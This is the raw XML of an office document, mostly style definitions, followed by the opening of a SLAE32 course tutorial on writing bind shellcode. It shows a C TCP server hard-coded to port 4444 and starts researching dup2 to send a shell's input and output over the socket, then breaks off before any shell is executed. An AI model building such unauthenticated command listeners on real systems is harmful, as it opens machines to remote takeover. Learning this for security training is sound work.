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7fe7" officeooo:paragraph-rsid="00037fe7"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0004fda3" officeooo:paragraph-rsid="0004fda3"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00059d79" officeooo:paragraph-rsid="00059d79"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00072221" officeooo:paragraph-rsid="00072221"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00080eed" officeooo:paragraph-rsid="00080eed"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00091c02" officeooo:paragraph-rsid="00091c02"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00094d76" officeooo:paragraph-rsid="00094d76"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000b349a" officeooo:paragraph-rsid="000b349a"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d1600" officeooo:paragraph-rsid="000d1600"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000ef8cf" officeooo:paragraph-rsid="000ef8cf"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0010f475" officeooo:paragraph-rsid="0010f475"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00116adb" officeooo:paragraph-rsid="00116adb"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00116adb" officeooo:paragraph-rsid="00135c6a"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00135c6a" officeooo:paragraph-rsid="00135c6a"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0013cbf9" officeooo:paragraph-rsid="0013cbf9"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00155dba" officeooo:paragraph-rsid="00155dba"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001d16e9" officeooo:paragraph-rsid="001d16e9"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0020dfcc" officeooo:paragraph-rsid="0020dfcc"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0020dfcc" officeooo:paragraph-rsid="0033b0b8"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0023a1cd" officeooo:paragraph-rsid="0023a1cd"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00259db7" officeooo:paragraph-rsid="00259db7"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0029f410" officeooo:paragraph-rsid="0029f410"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002ba596" officeooo:paragraph-rsid="002ba596"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0030503d" officeooo:paragraph-rsid="0030503d"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00339286" officeooo:paragraph-rsid="00339286"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00354705" officeooo:paragraph-rsid="00354705"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00362d8e" officeooo:paragraph-rsid="00362d8e"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003806ec" officeooo:paragraph-rsid="003806ec"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003806ec" officeooo:paragraph-rsid="003a5ee6"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0039e686" officeooo:paragraph-rsid="0039e686"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003a5ee6" officeooo:paragraph-rsid="003a5ee6"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003c6c68" officeooo:paragraph-rsid="003c6c68"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003c9f6c" officeooo:paragraph-rsid="003c9f6c"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003d6536" officeooo:paragraph-rsid="003d6536"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003d6536" officeooo:paragraph-rsid="0040fbce"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003e1be9" officeooo:paragraph-rsid="003e1be9"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003fc896" officeooo:paragraph-rsid="003fc896"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00400f81" officeooo:paragraph-rsid="00400f81"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0040fbce" officeooo:paragraph-rsid="0040fbce"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0044f36f" officeooo:paragraph-rsid="0044f36f"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0046c403" officeooo:paragraph-rsid="0046c403"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00072221" officeooo:paragraph-rsid="00072221"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" style:contextual-spacing="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:text-properties officeooo:rsid="0004fda3" officeooo:paragraph-rsid="0004fda3"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:text-properties officeooo:rsid="00135c6a" officeooo:paragraph-rsid="00135c6a"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:text-properties officeooo:rsid="00135c6a" officeooo:paragraph-rsid="0014ff92"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:text-properties officeooo:rsid="00135c6a" officeooo:paragraph-rsid="0019890b"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:text-properties officeooo:rsid="00135c6a" officeooo:paragraph-rsid="00155dba"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0033b0b8" officeooo:paragraph-rsid="0033b0b8"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0046c403" officeooo:paragraph-rsid="0046c403"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004c4e57" officeooo:paragraph-rsid="004c4e57"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004c4e57" officeooo:paragraph-rsid="004da0f0"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004fe428" officeooo:paragraph-rsid="004fe428"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0051be1d" officeooo:paragraph-rsid="0051be1d"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0052ff07" officeooo:paragraph-rsid="0052ff07"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00548150" officeooo:paragraph-rsid="00548150"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005537a4" officeooo:paragraph-rsid="005537a4"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003c9f6c" officeooo:paragraph-rsid="00569d1e"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003c9f6c" officeooo:paragraph-rsid="005b49ef"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00589b5f" officeooo:paragraph-rsid="00589b5f"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005958b6" officeooo:paragraph-rsid="005958b6"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005b49ef" officeooo:paragraph-rsid="005b49ef"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005ce008" officeooo:paragraph-rsid="005ce008"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005e4399" officeooo:paragraph-rsid="005e4399"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005f8277" officeooo:paragraph-rsid="0071d5f6"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005f915c" officeooo:paragraph-rsid="0071d5f6"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0062334d" officeooo:paragraph-rsid="0062334d"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00632129" officeooo:paragraph-rsid="00632129"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00632129" officeooo:paragraph-rsid="00646105"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00646105" officeooo:paragraph-rsid="00646105"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0066b3a2" officeooo:paragraph-rsid="0066b3a2"/>
    </style:style>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0068363a" officeooo:paragraph-rsid="0068363a"/>
    </style:style>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006a28f4" officeooo:paragraph-rsid="006a28f4"/>
    </style:style>
    <style:style style:name="P76" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006e1bf4" officeooo:paragraph-rsid="006e1bf4"/>
    </style:style>
    <style:style style:name="P77" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ec105" officeooo:paragraph-rsid="006ec105"/>
    </style:style>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0071d5f6" officeooo:paragraph-rsid="0071d5f6"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00725542" officeooo:paragraph-rsid="00725542"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00747daa" officeooo:paragraph-rsid="00747daa"/>
    </style:style>
    <style:style style:name="P81" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="007572d3" officeooo:paragraph-rsid="007572d3"/>
    </style:style>
    <style:style style:name="P82" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0075da54" officeooo:paragraph-rsid="0075da54"/>
    </style:style>
    <style:style style:name="P83" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0075da54" officeooo:paragraph-rsid="0075f663"/>
    </style:style>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0075f663" officeooo:paragraph-rsid="0075f663"/>
    </style:style>
    <style:style style:name="P85" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="007890b0" officeooo:paragraph-rsid="0079ed0b"/>
    </style:style>
    <style:style style:name="P86" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="007bcba8" officeooo:paragraph-rsid="007bcba8"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="00072221"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="00091c02"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="00094d76"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="0009f00a"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="000eabf7"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="0014ff92"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties officeooo:rsid="00155dba"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties officeooo:rsid="0017dfc9"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties officeooo:rsid="0019890b"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties officeooo:rsid="0021b3c9"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties officeooo:rsid="00272452"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties officeooo:rsid="002ba596"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties officeooo:rsid="003103bb"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties officeooo:rsid="0040fbce"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties officeooo:rsid="00485aca"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties officeooo:rsid="004a0727"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties officeooo:rsid="004da0f0"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties officeooo:rsid="00588feb"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties officeooo:rsid="005f8277"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties officeooo:rsid="0067ea75"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties officeooo:rsid="006a1cff"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties officeooo:rsid="006f30d0"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties officeooo:rsid="0070088b"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties officeooo:rsid="0071d5f6"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties officeooo:rsid="00725542"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties officeooo:rsid="00726b53"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties officeooo:rsid="0079ed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utorial was written for the Linux Assembly Expert SLAE32 course.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Challenge #1 – Bind Shellcode in assembly</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">There are potentially multiple ways to accomplish the mission, I chose to do the hard way. Instead of looking up a complete #C code and disassemble, I decided to build the #C code using internet resources to understand the tiny bits in it. Google is my friend.</text:p>
      <text:p text:style-name="P2">In principle the code should do the following:</text:p>
      <text:list xml:id="list1957861579980272204" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P46">open a socket (<text:span text:style-name="T1">stream socket in the Internet domain, TCP port</text:span>)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P46">bind to the socket</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P46">exec whatever is sent through the port</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">Opening a socket, basically a listener. My first match in google was this:</text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="http://www.linuxhowtos.org/C_C++/socket.htm">http://www.linuxhowtos.org/C_C++/socket.htm</text:a></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4">Server code looks like this:</text:p>
      <text:p text:style-name="P44">/* A simple server in the internet domain using TCP</text:p>
      <text:p text:style-name="P42"><text:s text:c="3"/><text:span text:style-name="T2">The port number is passed as an argument */</text:span></text:p>
      <text:p text:style-name="P43">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P43">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P43">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P43">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P43">#include &lt;sys/types.h&gt; </text:p>
      <text:p text:style-name="P43">#include &lt;sys/socket.h&gt;</text:p>
      <text:p text:style-name="P43">#include &lt;netinet/in.h&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P43">void error(const char *msg)</text:p>
      <text:p text:style-name="P43">{</text:p>
      <text:p text:style-name="P42"><text:s text:c="4"/><text:span text:style-name="T2">perror(msg);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="4"/><text:span text:style-name="T2">exit(1);</text:span></text:p>
      <text:p text:style-name="P43">}</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P43">int main(int argc, char *argv[])</text:p>
      <text:p text:style-name="P43">{</text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">int sockfd, newsockfd, portno;</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">socklen_t clilen;</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">char buffer[256];</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">struct sockaddr_in serv_addr, cli_addr;</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">int n;</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">if (argc &lt; 2) {</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="9"/><text:span text:style-name="T2">fprintf(stderr,"ERROR, no port provided\n");</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="9"/><text:span text:style-name="T2">exit(1);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">}</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">sockfd = socket(AF_INET, SOCK_STREAM, 0);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">if (sockfd &lt; 0) </text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="8"/><text:span text:style-name="T2">error("ERROR opening socket");</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">bzero((char *) &amp;serv_addr, sizeof(serv_addr));</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">portno = atoi(argv[1]);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">serv_addr.sin_family = AF_INET;</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">serv_addr.sin_addr.s_addr = INADDR_ANY;</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">serv_addr.sin_port = htons(portno);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">if (bind(sockfd, (struct sockaddr *) &amp;serv_addr,</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="14"/><text:span text:style-name="T2">sizeof(serv_addr)) &lt; 0) </text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="14"/><text:span text:style-name="T2">error("ERROR on binding");</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">listen(sockfd,5);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">clilen = sizeof(cli_addr);</text:span></text:p>
      <text:p text:style-name="P42"><text:soft-page-break/><text:s text:c="5"/><text:span text:style-name="T2">newsockfd = accept(sockfd, </text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="17"/><text:span text:style-name="T2">(struct sockaddr *) &amp;cli_addr, </text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="17"/><text:span text:style-name="T2">&amp;clilen);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">if (newsockfd &lt; 0) </text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="10"/><text:span text:style-name="T2">error("ERROR on accept");</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">bzero(buffer,256);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">n = read(newsockfd,buffer,255);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">if (n &lt; 0) error("ERROR reading from socket");</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">printf("Here is the message: %s\n",buffer);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">n = write(newsockfd,"I got your message",18);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">if (n &lt; 0) error("ERROR writing to socket");</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">close(newsockfd);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">close(sockfd);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="5"/><text:span text:style-name="T2">return 0; </text:span></text:p>
      <text:p text:style-name="P45">}</text:p>
      <text:p text:style-name="P4">Now we need to clean it up, as we don't care about error handling and other pretty important stuff important in a normal programming project. The cleaned code look like this below:</text:p>
      <text:p text:style-name="P5">/* A simple server in the internet domain using TCP</text:p>
      <text:p text:style-name="P5"><text:s text:c="3"/>The port number is passed as an argument */</text:p>
      <text:p text:style-name="P5">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P5">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P5">#include &lt;sys/socket.h&gt;</text:p>
      <text:p text:style-name="P5">#include &lt;netinet/in.h&gt;</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">int main(void)</text:p>
      <text:p text:style-name="P5">{</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>int sockfd, newsockfd, portno; //file descriptor, client file descriptor</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>socklen_t clilen; //socket length for new connections</text:p>
      <text:p text:style-name="P5"><text:tab/> </text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>char buffer[256]; //<text:span text:style-name="T4">used for storing the incoming string</text:span></text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>struct sockaddr_in serv_addr, cli_addr; //server listen address, client address</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>int n; //<text:span text:style-name="T5">used later as a variable for command output</text:span></text:p>
      <text:p text:style-name="P5"><text:tab/> </text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>sockfd = socket(AF_INET, SOCK_STREAM, 0); //create TCP socket http://man7.org/linux/man-pages/man7/socket.7.html</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>bzero((char *) &amp;serv_addr, sizeof(serv_addr)); //zeroes out some memory http://man7.org/linux/man-pages/man3/bzero.3.html</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>portno = 4444; //port to listen on</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>serv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>serv_addr.sin_addr.s_addr = INADDR_ANY; // listen on any address, converted to network byte order</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>serv_addr.sin_port = htons(portno); // server port, converted to network string order</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>bind(sockfd, (struct sockaddr *) &amp;serv_addr, sizeof(serv_addr)); //bind to socket http://man7.org/linux/man-pages/man2/bind.2.html</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>listen(sockfd,5); //listen on socket http://man7.org/linux/man-pages/man2/listen.2.html</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>clilen = sizeof(cli_addr); // accept new connections</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>newsockfd = accept(sockfd, (struct sockaddr *) &amp;cli_addr, &amp;clilen); // accept new connections</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>bzero(buffer,256);</text:p>
      <text:p text:style-name="P5"><text:soft-page-break/><text:s text:c="5"/>n = read(newsockfd,buffer,255);</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>printf("Here is the message: %s\n",buffer);</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>n = write(newsockfd,"I got your message",18);</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>close(newsockfd); //close socket</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>close(sockfd); //close socket</text:p>
      <text:p text:style-name="P5"><text:s text:c="5"/>return 0; </text:p>
      <text:p text:style-name="P5">}</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">Ok, so we can receive messages and <text:span text:style-name="T3">can </text:span>print them out. <text:span text:style-name="T3">Now we need to execute a command and redirect all STDIN/STDOUT and STDERR to out socket. We need to do some research on order to do this (or watch the SLAE32 videos again). I found the following help about pipes and redirecting:</text:span></text:p>
      <text:p text:style-name="P6"><text:a xlink:type="simple" xlink:href="http://www.tldp.org/LDP/lpg/node11.html">http://www.tldp.org/LDP/lpg/node11.html</text:a></text:p>
      <text:p text:style-name="P6">DUP2 will be our choice:</text:p>
      <text:p text:style-name="P6">SYSTEM CALL: dup2(); <text:s text:c="57"/></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"><text:s text:c="2"/>PROTOTYPE: int dup2( int oldfd, int newfd ); <text:s text:c="33"/></text:p>
      <text:p text:style-name="P6"><text:s text:c="4"/>RETURNS: new descriptor on success <text:s text:c="41"/></text:p>
